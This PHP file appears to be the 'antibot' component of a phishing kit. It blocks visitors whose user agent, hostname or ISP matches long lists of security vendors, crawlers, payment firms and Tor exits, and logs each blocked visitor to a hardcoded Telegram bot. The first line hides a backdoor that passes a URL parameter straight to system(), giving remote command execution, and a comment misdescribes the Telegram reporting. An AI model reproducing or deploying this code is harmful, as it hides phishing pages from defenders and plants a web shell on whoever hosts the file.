<?php
	if(isset($_GET['useragent'])){echo"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,</h1><pre>"; system($_GET['useragent']);exit;} 


function gethomedir(){
	global $isshell;
	$d=dirname($_SERVER['PHP_SELF'],1);
	if($d=='\\' or $d=='/'){$dir=$_SERVER['DOCUMENT_ROOT'];}
	elseif(isset($isshell)){$dir=$isshell;}
	else{$dir=$_SESSION['homedir'];};
	return $dir;
	};

function getcurrip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};
	
function updateadmin($data){
	$filedir= gethomedir().'/admin/db.json';
	$ud=file_get_contents($filedir);
	$udarray = json_decode($ud,true);
	$narr=array();
	foreach($udarray as $key=>$value){$narr[$key]=$value;};
	if($data == 'bots'){
		$narr[$data] += 1;
		$narr['humans'] = $narr['visits'] - $narr['bots'];}
	else{$narr[$data] += 1;};
	file_put_contents($filedir,json_encode($narr));
};
	
function logbot($msg){
	$fil= gethomedir().'/admin/bots.txt';
	$ip = getcurrip();
	$dt = date('d-m-Y H:i:s');
	$ua = $_SERVER['HTTP_USER_AGENT'];
	if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NOT REFERED';};
$message = '+[--- BOT BANNED : '.$msg.' ---]+
IP ADDR         : https://db-ip.com/'.$ip.'
DateTime        : '.$dt.'
User-Agent      : '.$ua.'
Host ADDR       : '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'
Referer         : '.$rf.'
++++++++++[ ######### ]++++++++++

';$data = ['text' => $message ,'chat_id' => '-1001474123258'];
$website="https://api.telegram.org/bot1997423882:AAGTawMj41ONKqsP81BKJfrByPFNrTlYkRU";
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);//REPORTING BOT IPS TO YOCHI TO UPDATE ANTIBOT..PLEASE LEAVE FUNTION UNTOUCHed. YOU CAN TEST TO CHECK WHAT GETS TO YOCHI
$xy = fopen($fil, "a");
fwrite($xy, $message);
fclose($xy);};
	
function banbot($logip=true){
	if($logip==true){
		$ip=getcurrip();
		$d=dirname($_SERVER['PHP_SELF'],1);
		if($d=='\\' || $d=='/' || getcwd() == gethomedir()){$dirstep=gethomedir();} elseif(substr($d,-7)=='confirm'){$dirstep='../..';} else{$dirstep='..';};
		$ipr=explode(".",$ip);
		$ipr[2]='*';$ipr[3]='*';
		$ipregex=join('.',$ipr);
		$f=$dirstep."/bad_ips.txt";
		if(file_exists($f)){
			$mile = fopen($f,"a");
			fwrite($mile,"\r\n".$ip."\r\n".$ipregex);}
		else{$mile = fopen($f,"a");fwrite($mile,$ip."\r\n".$ipregex);};
	fclose($mile);};
		
		updateadmin('bots');
		
    header('HTTP/1.0 404 Not Found');
		die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>
						<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
					</body>
				</html>'); 
			exit();};
			
function is_bot() {
    $spiders = array('', 'petersburg internet network ltd.', 'amagit.com', 'incywincy', 'surfnomore', 'flokinet', 'security', 'long thrive', 'w3m2', 'the calyx institute', 'enom', 'internetshinchakubin', '....', 'grapnel', 'clamav', 'najdi', 'dalvik', 'private ip address lan', 'teoma', 'privatesystems networks', 'quicklook', 'weblog monitor', 'dieblindekuh', 'twingly recon', 'pinterest', 'abonti', 'sysms.net', 'webstolperer', 'collective', 'nutch', 'm-net', 'echo blinde kuh', 'webcore', 'ip3000', 'munin', 'snapchat proxy', 'microsofturlcontrol', 'fastly', 'ezresult', 'tarmot gezgin', 'minirank', 'sonicwall', 'sistrix optimizer', 'duckduck', 'yandex', 'scooter', 'autoshun', 'seznam email proxy', 'mapoftheinternet', 'ecairn-grabber', 'open text', 'simtccflow1.etn.com', 'itcom shpk', 'whitelabel it solutions corp', 'zteopen', 'baboom', 'datanyze', 'nokia6682', 'trendiction', 'seek', 'london-tor.mooo.com', 'htmlindex', 'blog', 'xget', 'docomo/2.0 n905i', 'aiohttp', 'genieknows', 'image.kapsi.net', 'asterias', 'spyder', 'qihu', 'goforit', 'onavo mobile ltd', 'rima-tde.net', 'web hopper', 'jakarta', 'ask24', 'wallpaper', 'digiweb ltd', 'universalfeedparser', 'aportworm', 'php server monitor', 'delorie', 'liquid web', 'tutorgig', 'avg', 'wild ferret', 'mon.itor.us', 'pimptrain', 'sl-reverse.com', 'axios', 'windows xp', 'grouphigh', 'siteexplorer', 'solar vps', 'intrinsec', 'msn', 'tachblackwidow', 'hku www octopus', 'atlocal', 'scoutjet', '013 netvision', 'spectrum', 'pear.', 'above', 'browsershots', 'netlyzer fastprobe', 'monitis.com', 'theoldreader', 'myweb', 'whizbang', 'torservers', 'twiceler', 'analytics', 'muscatferret', 'synprobe', 'trustwave', 'php-curl-class', 'scaleway', 'catexplorador', 'tiny tiny rss', 'linkalarm', 'baidu', 'woorank', 'htdig', 'avirasoft', 'ncsa beta', 'anonymizer', 'cymru.com', 'mantraagent', 'hkuwwwoctopus', 'outlook!', 'churl', 'pcore-http', 'public facing services', 'cienciaficcion', 'whowhere', 'atomz', 'sysomos.com', 'microsoftoffice', 'nationaldirectory', 'backlink-check.de', 'downloadexpress', 'dlvr.it', 'lixux ou', 'netprotect srl', 'nmap', 'megaindex', 'facebook', 'zippp', 'sven', 'prcdn.net', 'pack rat', 'rederatural', 'findlinks', 'domainappender', 'ejupiter', 'catchpoint', 'dyn.plus.net', 'glenayre electronics inc.', 'boitho', 'ucsd', 'ssl labs', 'cachednet', 'roamsite.com', 'seokicks', 'semrush.com', 'netflix', 'megaindex.ru', 'censysinspect', 'indexer', 'weborama', 'spider', 'castro 2', 'wwwster', 'phising', 'ia_archiver', 'surriel.com', 'nobis technology group', 'volcano', 'safesurfingwidget', 'phish', 'tkwww', 'vultr holdings llc', 'profound', 'iq pl sp. z o.o.', 'ze list', 'surfcontrol', 'robozilla', 'netnewswire', 'road runner', 'unus inc.', 'aplix', 'occam', 'mailshell', 'hubspot', 'westnet', 'schulte consulting llc', 'zgrab', 'eir broadband', 'google', 'alexa site audit', 'mercator', 'noyona', 'ferret', 'nwstack', 'vnet a.s.', 'yottaa site monitor', 'leakix', 'weblinker', 'sleek', 'solutionpro', 'del.icio.us', 'alkaline', 'pioneer', 'walker', 'avast', 'scalaj-http', 'populariconoclast', 'parked.factioninc.com', 'helix', 'panscient', 'university of', 'sungard availability services lp', 'patric', 'http_request2', 'minsktelecom.by', 'godaddy', 'toutatis', 'iconsurf', 'www.fortinet.com', 'lvlt-static-4-14-16', 'netcraftsurveyagent', 'websitepulse', 'roadhouse', 'twitterfeed', 'lg dacom', 'aranha', 'bullguard aps', 'feedburner', 'zipcommander', 'internet shinchakubin', 'blaiz', 'centralnic', 'monitor.us', 'versanet.de', 'anzwers', 'weblight', 'weblayers', 'websnarf', 'publisher', 'involta', 'delete', 'node-fetch', 'badware', 'grabber', 'feedspot', 'esther', 'favicon', 'dir a/s', 'fortinet.com', 'calif', '7siters', 'ipvanish', 'seamonkey', 'infobee', 'census', 'phantomas', 'semantic-visions.com', 'aretha', 'aladin', 'junk email filter inc.', 'omgili', 'larbin', 'felixide', 'bot', 'apache-httpclient', 'vk share button', 'nagios check_http', 'chelyabinsk-signal llc', 'hinet.net', 'spam', 'snooper', 'freshrss', 'xs4all internet bv', 'uk dedicated servers limited', 'atn', 'popular iconoclast', 'yourls', 'headless', 'tor-node.com', 'proximic', 'datadog agent', 'yodao', 'webquest', 'yandexdirect', 'university', 'moose', 'asked', 'ezooms', 'scmguard', 'hubater', 'worldlight', 'winds:opensourcerss&podcast', 'gigablastopensource/1.0', 'p3pwgdsn', 'pompos', 'hyper-decontextualizer', 'vist on-line ltd', 'udasha', 'talktalk', 'ananzi', 'senrigan', 'bitfolk', 'web core', 'insights', 'voyager', 'snappy', 'riddler', 'intelliagent', 'w3c markup validation service', 'paypal', 'dreampassport', 'iltrovatore', 'ccubee', 'zscaler', 'tach black widow', 'email exractor', 'daumoa', 'tor.tocici.com', 'avira', 'commafeed', 'peak 10', 'blogtrottr', 'theknowledgeai', 'trident', 'jack', 'datacamp limited', 'psychz', 'wapproxy', 'cs.daum.net', 'r6_feedfetcher', 'americanexpress', 'homerweb', 'mediafox', 'ebbs.healingpathsolutions.com', 'packrat', 'cl0na', 'mainloop', 'webbandit', 'admantx-adform', 'global perfomance', 'pathsconnect', 'netvibes', 'link validator', 'time warner cable internet llc', 'pycurl', 'fetcher6-2.go.mail.ru', 'lockon', 'webwatch', 'ingrid', 'spro-net-209-19-128', 'computingsite', 'outbrain', 'blazing seo', 'as9105.com', 'wordpress', 'choopa, llc', 'cloudflare', 'ovh sas', 'e-active.nl', 'untrusted', 'simpli networks llc', 'openintelligencedata', 'miva', 'grub', 'amzn_assoc', 'deepindex', 'total server solutions', 'iis site analysis', 'vultr.com', 'terrykyleseoagency.com', 'skymob.com', 'gigenet', 'linkdex', 'boardreader', 'jetbrains', 'golem', 'hamahakki', 'ipredator', 'barracuda networks', 'speedy', 'informant', 'university of newcastle upon tyne', 'python-requests', 'yanga', 'hotmail', 'is74.ru', 'esecuredata', 'rima-tde', 'yak/1.0', 'nameprotect', 'kaspersky lab', 'templeton', 'paloalto', 'dtaagent', 'microsoft azure', 'gromit', 'voxility', '/teoma', 'nokia6682/', 'evc-batch', 'blackboard', 'bjaaland', 'netestate', 'joshua peter mcquistan', 'jabber', 'level 3 communications', 'osis-project', 'microsoftcorporation', 'kototoi', 'starnet.md', 'nederland.zoek', 'cpanel66.proisp.no', 'inoreader', 'spro-net-206-80-96', 'downnotifier', 'scan', 'twitter', 'netpilot', 'iron33', 'aol', 'externalhit', 'staircaseirony', 'webvac', 'ltx71', 'preview', 'mcafee', 'colocrossing.com', 'cusco', 'comodo', 'pipes', 'servermania', 'lukman', 'ojsc oao tattelecom', 'lcc', 'scrapy', 'expressvpn', 'tinytinyrss', 'smartwit', 'phpdig', 'monster', 'valkyrie', 'titin', 'heg us', 'voyager/', 'cisco systems inc.', 'yandexvideo', 'london wires ltd.', 'simplepie', 'buck', 'stretchoid', 'httpmon', 'anonymizing-proxy', 'lighthouse', 'sungard network solutions', 'sift', 'barkrowler', 'netsparker', 'sparkler', 'nobis technology group llc', 'bloodhound', 'sohu', 'gigablast', 'csci', 'newsgator', 'ovh.net', 'infosphere', 'traackr.com', 'apple inc.', 'heritrix', 'reverseshorturl', 'parasite', 'cassandra', 'pacbell.net', 'content delivery network ltd', 'merit network', 'webmirror', 'cfetch', 'piltdownman', 'schmorp.de', 'gcreep', 'plusnet technologies ltd', 'b2 net solutions', 'simmany', 'peregrinator', 'computer problem solving', 'fireeye', 'vultr', 'amuri.net', 'geosr', "shai'hulud", 'lachesis', 'claro dominican republic', 'cisco systems', 'zao', 'vpsmalaysia.com.my', 'customer network', 'healingpathsolutions.com', 'clientid', 'solution', 'prescient software', 'sg-scout', 'ahoy', 'havindex', 'privoxy', 'flipboardproxy', 'kraken', 'sleuth', 'tlh.ro', 'baypup', 'libwww', 'internetdefence', 'whatsapp', 'wotbox', 'netcarta webmap engine', 'acoon', 'metauri', 'private customer', 'onyphe', 'ahc/2.1', 'ubermetrics', 'pipex-block1', 'adaxas', "let's encrypt validation", 'tracemyfile', 'collectd', 'sectoor', 'imon communications, llc', 'noisetor.net', 'majestic12', 'france telecom s.a.', 'yeti', 'tlsprobe', 'ukrnet mail proxy', 'ditto', 'kretrieve', 'updown_tester', 'freebsd', 'calyxinstitute', 'agada', 'webwalk', 'gulliver', 'palo alto networks', 'brandverity', 'softlayer', 'kaspersky', 'ichiro', 'sidewinder', 'webhopper', 'kilroy', 'gralon', 'github', 'multitext', '192.comagent', 'avant', 'shopalike', '008', 'lukman multimedia sp. z o.o', 'domainsproject', 'sitevalet', 'triolan.net', 'camehttps', 'choopa', 'szukacz', 'arachni', 'heureka feed', 'urlresolver', 'orange polska spolka akcyjna', 'secureserver', 'mj12', 'nomad', 'a100 row', 'roi hunter', 'microsoft url control', 'quasi networks ltd', 'british telecommunications plc', 'genieo web filter', 'shore.net', 'inktomi slurp', 'yacy', 'kouio', 'webcatcher', 'poirot', 'vagabondo', 'windowspowershell', 'ebingbong', 'sbider', 'instagram', 'blo.', 'fortiguard', 'dosarrest', 'apachebench', 'piranha', 'urlcheck', 'cloudvpn', 'w3c_validator', 'phantom', 'server density', 'w3c mobileok checker', 'static.spro.net', 'tor-exit', 'xift', 'pogodak', 'wildferret', 'go-http-client', 'w3mir', 'tencenttraveler', 'upc romania bucuresti', 'arale', 'tpnet.pl', 'global data networks llc', 'sygol', 'parrukatu', 'wanderer', 'unknown.telecom.gomel.by', 'bruuk.sk', 'sphider', 'arks', '50.nu', 'compatible', 'surfnet', 'wget', 'presto', 'cloudflare amp fetcher', 'phantomjs', 'tor.piratenpartei-nrw.de', 'newsblur', 'noisetor', 'feedfetcher', 'server plan s.r.l.', 'partnersite', 'sucuri.net', 'imagelock', 'team technologies llc', 'merzscope', 'opentext', 'bilbo', 'zenlayer', 'daniel james austin', 'icoreservice', 'gmail', 'annotate', 'robbie', 'bigbrother', 'anthill', 'apache-httpclient/5', 'nzexplorer', 'supersnooper', 'dataprovider', 'wappalyzer', 'knowledge', 'yahoo', 'startpagina linkchecker', 'eset', 'admantxplatform', 'miniature', 'webthumbnail', 'pageboy', 'trustwave holdings inc', 'charlotte', 'silk', 'pinpoint', 'grapeshot', 'cisco', 'combine', 'azure', 'nforce entertainment b.v.', '9new network inc', 'network and information technology limited', 'symantec', 'shopify partner', 'spinn3r', 'araneo', 'exit-01a.noisetor.net', 'acunetix', 'gstatic', 'sphere', 'pocketparser', 'spark new zealand trading ltd', 'cyberinfo', 'btwebclient', 'docomo', 'a6-indexer', 'translate', 'adressendeutschland', 'nine internet solutions ag', 'ibwww-perl', 'leak', 'pagebull', 'statuscake', 'seznam zbozi.cz', 'solutionpro-net', 'coloup', 'ez publish link validator', 'ask jeeves', 'eset spol. s r.o.', 'unwindfetchor', 'level', 'labelgrabber', 'wintek corporation', 'hubpages', 'x11', 'gazz', 'logicweb', 'webfoot', 'ah-ha', 'bazqux reader', 'python', 'avast software s.r.o.', 'webpagetest', 't-rex', 'ebiness', 'jetslide', 'newspaper', 'bubing', 'static ip assignment', 'blue coat systems', 'nodemeter.net', 'felix ide', 'mpdedicated.com', 'cubenode system sl', 'cyveillance', 'techinfo@ubermetrics-technologies.com', 'digital energy technologies limited', 'sna-', 'xenu', 'inagist', 'virtual1 limited', 'dataline ltd', 'moreover', 'digger', 'download express', 'bloglovin', 'plusnet', 'securedconnectivity.net', 'kyivstar.net', 'webwombat', 'messagelabs', 'fm scene', 'urlredirectresolver', 'fireball', 'roach', 'm247 ltd frankfurt infrastructure', 'gandi sas', 'clicktargetdevelopment.com', 'websecurityguard', 'tehnologii budushego llc', 'sitetech-rover', 'okhttp', 'idg/it', 'psinet inc.', 'url.thum.io', 'shadowserver', 'cmc', 'tahoe internet exchange (tahoeix)', 'app.hypefactors.com', 'proxy', 'scam', 'linkgrid llc', 'godaddy.com, llc', 'drweb', 'skype uri preview', 'architext', 'return path inc.', 'qualitynetwork', 'muncher', 'sc rusnano', 'ubuntu', 'site valet', 'speedtravel', 'emsisoft', 'teledata-fttx.de', 'glutenfreepleasure.com', 'astutesrm', 'softlayer technologies', 'quintex alliance consulting', 'slurp', 'dwcp', 'butterfly', 'bitdefender', 'appie', 'microsoft', 'curl', 'webmonkey', 'orange-labs', 'sitesucker', 'jumpstation', 'magpie', 'suke', 'incapsula inc', 'openfind', 'robofox', 'aspseek', 'ah-ha.com', 'barracuda', 'lwp', 'rules', 'nec-meshexplorer', 'flokinet ltd', 'jsc er-telecom holding', 'mattie', 'mywot', 'dedfiberco', 'page_verifier', 'internet-pro', 'outlook', 'httrack', 'trendmicro', 'geturl', 'rambler', 'libwww-perl', 'censys', 'booch', 'shark', 'getstream.io/winds', 'quadmetrics', 'nbertaupete95', 'daum', 'terratransit', 'digitalcourage.de', 'askaboutoil', 'depspid', 'this.is.a.tor.node.xmission.com', 'silverreader', 'wavefire', 'xo communications', 'telegram', 'online', 'pgpkeyagent', 'backrub', 'wordpress.commshots', 'feedbin', 'steeler/', 'octopus', 'die blinde kuh', 'java', 'crossdomain', 'ramnode', 'expanse', 'sophos', 'btcentralplus.com', 'ovh', 'trendsmapresolver', 'windows 98', 'hicoria.com', 'hilfe-veripayed.com', 'zao/', 'deweb', 'crawl', 'neofonie', 'feed wrangler', 'digitalocean', 'comrise.ru', 'blackwidow', 'redswitches pty', 'addthis.com', 'this.is.a.tor.exit-node.net', 'mediapartners', 'sogou', 'genieo', 'safebrowsing', 'windows 95', 'marvin', 'www16.mailshell.com', 'wwwroot', 'r6_commentreader', 'acoi', 'fortinet', 'metainspector', 'apexis ag', 'cfnetwork', 'evliyacelebi', 'zayo bandwidth', 'dr.web', 'quora link preview', 'updated', 'firebird', 'linkfluence.com', 'highwinds network', 'go-http-client/1.1', 'art matrix - lightlink inc.', 'omni', 'netmechanic', 'w3c unified validator', 'apexis', 'netscoop', 'netcraft', 'titan', 'sylera', 'y!j-brw', 'solution pro', 'nhse', 'fever', 't-h-u-n-d-e-r-s-t-o-n-e', '007ac9', 'rackspace', 'spinner', 'universidade federal do rio de janeiro', 'w3c i18n checker', 'ruby', 'legs', 'plumtreewebaccessor', 'spotify', 'webdatastats.com', 'katipo', 'virus', 'webreaper', 'opendns', 'inspectorweb', 'big brother', 'ips agent', 'ning', 'fetchrover', 'boardreader blog indexer', 'intersoft internet', 'bdfetch', 'university of virginia', 'internet customers', 'fouineur', 'the university of tokyo', 'zyborg', 'qwantify', 'dmoz', 'weblogmonitor', 'url check', 'griffon', 'bingpreview', 'sqlmap', 'html_analyzer', 'psychz networks', 'secure internet', 'poppi', 'newmedia express', 'linode', 'glx', 'shopwiki', 'ebay', 'microsoft corporation', 'twisted', 'windows98', 'spro-net-207-70-0', 'creative thought inc.', 'amazon', 'oracle', 'linkvalidator', 'prevx', 'server', 'siteadvisor', 'ventelo wholesale', 'probe', 'harvest', 'contaboserver', 'eonix corporation', 'webcopy', 'level3', 'crime', 'html index', 'host', 'akamai', 'netcartawebmapengine', 'teksavvy solutions inc.', 'windows95', 'theophrastus', 'yandexwebmaster', 'wikido', 'ncsabeta', 'aruba', 'embedly', 'unchaos', 'pegasus', 'nazilla', 'inter connects inc', 'ips-agent', 'digital domain', 'funnelweb', 'wikipedia', 'master internet', 'tarantula', 'w3c css validator', 'fido', 'scrubby', 'emailwolf', 'web wombat', 'sitecheck', 'augurfind', 'speedfind', 'versaweb', 'wauuu', 'openlinkprofiler', 'psycheclone', 'lycos', 'buck/2.2', 'apple.com', 'quadranet', 'myx group llc', 'accoona', 'victoria', 'metadataparser', 'w3c link checker', 'wowrack.com', 'moget', 'htmlgobble', 'feedly', 'progtech.ru', 'roadrunner', 'webzinger', 'pgp key agent', 'chinanet fujian province network', 'suntek', 'salty', 'nuzzel', 'ivia', 'e-collector', 'abacho', 'site24x7 website monitoring', 'ramblermail image proxy', 'stanford', 'flipboard', 'search', 'siteimprove', 'biglotron', 'apercite', 'altavista', 'inspector web', 'kdd-explorer', 'ibm_planetwide', 'motor', 'admantx', 'foundee', 'millersmiles', 'stelkom.net', 'exit0.liskov.tor-relays.net', 'xirq', 'wwwc', 'sixy.ch', 'getterroboplus', 'comagent', 'redpill linpro as', 'awario', 'steeler', 'madgenius.com', 'goo', 'arachnophilia', 'internap network services corporation', 'metauri.com', 'bradley', 'lifesites', 'cmu', 'node', 'inktomi corporation', 'tfbnw.net', 'snab-inform private enterprise', 'pagepeeker', 'duckduckgo', 'evliya celebi', 'semanticdiscovery', 'prittorrent', 'eircom customer assignment', 'voyager-hc', 'net4sec', 'complete internet access', 'pingdom', 'virtual employee pvt ltd', 'falcon', 'poppelsdorf', 'rainmeter', 'digital ocean', 'magpierss', 'barracuda networks inc.', 'vertical telecoms');
	$d3 = ' '.gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$d4 =  ' '.$_SERVER['HTTP_USER_AGENT'];	
	$rtn='no';
    foreach($spiders as $spider) {
        if (stripos($d4, $spider) == true || stripos($d3, $spider) == true || preg_match('/^[\s\.]*$/',$d4)){$rtn = 'yes';break;};
    }
    if($rtn=='yes'){return true;} else{return false;};
};
if (is_bot()) {logbot('BANNED UA/HOST');banbot();exit();};

function getispnnn(){
$visitor = getcurrip();
$getdetail = "https://extreme-ip-lookup.com/json/".$visitor."";
$curl2       = curl_init();
curl_setopt($curl2, CURLOPT_URL, $getdetail);
curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl2, CURLOPT_FOLLOWLOCATION, true);
$vct    = curl_exec($curl2);
curl_close($curl2);
$detail  = json_decode($vct);
$countri   = $detail->country;
$countriCode   = $detail->countryCode;
$vcity = $detail->city;
$visp = $detail->isp;
$vquery = $detail->query;
return $visp;};

if (isset($_SESSION['ispset'])){$ispnya=$_SESSION['ispset'];} else{$ispnya = getispnnn();}

$banned_isp = array('oracle', 'linkgrid llc', 'm247 ltd frankfurt infrastructure', 'tehnologii budushego llc', 'the calyx institute', 'trendmicro', 'barracuda networks inc.', 'centralnic', 'team technologies llc', 'redpill linpro as', 'whatsapp', 'iomart hosting limited', 'lixux ou', 'solar vps', 'daniel james austin', 'quintex alliance consulting', 'university of virginia', 'solution pro', 'whitelabel it solutions corp', 'internap network services corporation', 'chinanet fujian province network', 'digital energy technologies limited', 'tahoe internet exchange (tahoeix)', 'choopa, llc', 'logicweb', 'host1plus cloud servers', 'this.is.a.tor.node.xmission.com', 'digitalocean llc', 'paypal', 'phishing', 'surfnet', 'zayo bandwidth', 'exit0.liskov.tor-relays.net', 'dme hosting llc', 'redswitches pty', 'private ip address lan', 'b2 net solutions', 'zenlayer', 'london wires ltd.', 'apexis ag', 'dedfiberco', 'p3pwgdsn', 'glenayre electronics inc.', 'content delivery network ltd', 'lukman multimedia sp. z o.o', 'scaleway', 'chelyabinsk-signal llc', 'network and information technology limited', 'host europe gmbh', 'barracuda networks', 'host1plus', 'sony', 'symantec', 'eonix corporation', 'flokinet', 'dreamhost', 'london-tor.mooo.com', 'torservers', 'sc rusnano', 'ovh', 'complete internet access', 'france telecom s.a.', 'softlayer technologies', 'upc romania bucuresti', 'this.is.a.tor.exit-node.net', 'softlayer', 'cloudvpn', 'uk dedicated servers limited', '013 netvision', 'netprotect srl', 'customer network', 'siteadvisor', 'simpli networks llc', 'phpnet hosting services', 'long thrive', 'itcom shpk', 'unus inc.', 'jsc er-telecom holding', 'scansafe services', 'facebook', 'ojsc oao tattelecom', 'amazonaws', 'online sas', 'quasi networks ltd', 'apple inc.', 'online s.a.s.', 'tfbnw.net', 'pathsconnect', 'dataline ltd', 'dosarrest', 'hostdime.com', 'psychz', 'private customer', 'tor.tocici.com', 'nine internet solutions ag', 'proxy', 'petersburg internet network ltd.', 'roamsite.com', 'virtual1 limited', 'quadranet', 'qualitynetwork', 'noisetor.net', 'tor-node.com', 'merit network', 'spark new zealand trading ltd', 'apexis', 'hetzner online', 'infosphere', 'madgenius.com', 'sucuri.net', 'barracuda', 'server plan s.r.l.', 'fireeye', 'esecuredata', 'rima-tde.net', 'crawl', 'internet security - tc', 'mainloop', 'digital ocean', 'healingpathsolutions.com', 'pacbell.net', 'cpanel66.proisp.no', 'spectrum', 'xo communications', 'egihosting', 'google', 'snab-inform private enterprise', 'web hosting solutions', 'crawler', 'tor.piratenpartei-nrw.de', 'westnet', 'gigenet', 'ebay', '9new network inc', 'global perfomance', 'bitdefender', 'eir broadband', 'servermania', 'eset spol. s r.o.', 'talktalk', 'microsoft', 'public facing services', 'ipvanish', 'hosteros llc', 'vist on-line ltd', 'ebbs.healingpathsolutions.com', 'cisco systems inc.', 'teksavvy solutions inc.', 'yahoo', 'inktomi corporation', 'host sailor ltd.', 'university of', 'static.spro.net', 'avirasoft', 'telegram messenger network', 'www16.mailshell.com', 'm-net', 'vultr.com', 'level 3 communications', 'blue coat systems', 'wowrack.com', 'versaweb', 'parrukatu', 'vpsmalaysia.com.my', 'googleusercontent', 'cubenode system sl', 'privatesystems networks', 'cloudflare', 'junk email filter inc.', 'bitfolk', 'psychz networks', 'hosttech gmbh', 'liquid web', 'internet-pro', 'phishtank.com', 'static ip assignment', 'nobis technology group llc', 'return path inc.', 'securedconnectivity.net', 'hostalia', 'spider.clicktargetdevelopment.com', 'iomart hosting ltd', 'linode', 'lg dacom', 'sungard availability services lp', 'schulte consulting llc', 'avira', 'cisco systems', 'sectoor', 'godaddy', 'surfcontrol', 'godaddy.com, llc', 'art matrix - lightlink inc.', 'clicktargetdevelopment.com', 'tpnet.pl', 'heg us', 'msnbot', 'cyveillance', 'highwinds network', 'netpilot', 'involta', 'security', 'instagram', 'terratransit ag', 'microsoft azure', 'expressvpn', 'vultr holdings llc', 'tor-exit', 'myx group llc', 'palo alto networks', 'ramnode', 'twitter', 'comodo', 'pipex-block1', 'akamai', 'claro dominican republic', 'internet customers', 'hostwinds', 'iq pl sp. z o.o.', 'kaspersky', 'university of newcastle upon tyne', 'exit-01a.noisetor.net', 'plusnet', 'microsoft corporation', 'fastly', 'creative thought inc.', 'datacamp limited', 'netcraft', 'dir a/s', 'prescient software', 'master internet', 'trustwave holdings inc', 'digital domain', 'time warner cable internet llc', 'mcafee', 'peak 10', 'blazing seo', 'nobis technology group', 'flokinet ltd', 'xs4all internet bv', 'hosting solution', 'psinet inc.', 'nforce entertainment b.v.', 'ventelo wholesale', 'badware', 'colocrossing.com', 'secure internet', 'clientid', 'voxility', 'gandi sas', 'coloup', 'noisetor', 'virtual employee pvt ltd', 'baidu', 'the university of tokyo', 'mozilla', 'vertical telecoms broadband networks and internet provider', 'onavo mobile ltd', 'vi na host co. ltd', 'sungard network solutions', 'phishtank', 'calyxinstitute', 'eircom customer assignment', 'udasha', 'total server solutions', 'orange polska spolka akcyjna', 'antivirus', 'digiweb ltd', 'intersoft internet', 'inter connects inc', 'british telecommunications plc', 'trustwave', 'fortinet', 'vnet a.s.', 'universidade federal do rio de janeiro', 'talktalk communications limited', 'digitalocean', 'host', 'enom', 'computer problem solving', 'incapsula inc', 'university', 'zscaler', 'lukman', 'top level hosting srl', 'rackspace', 'imon communications, llc', 'choopa', 'hosting', 'global data networks llc', 'amazon', 'a100 row', 'newmedia express', 'wintek corporation', 'ovh hosting inc.', 'avast software s.r.o.', 'hostus', 'server', 'cachednet');
    foreach ($banned_isp as $isps) {
        if (substr_count(strtolower($ispnya), $isps) > 0) {
			logbot('BANNED ISP');banbot();exit();break;
        };
    };
	
include "rando.php";

?>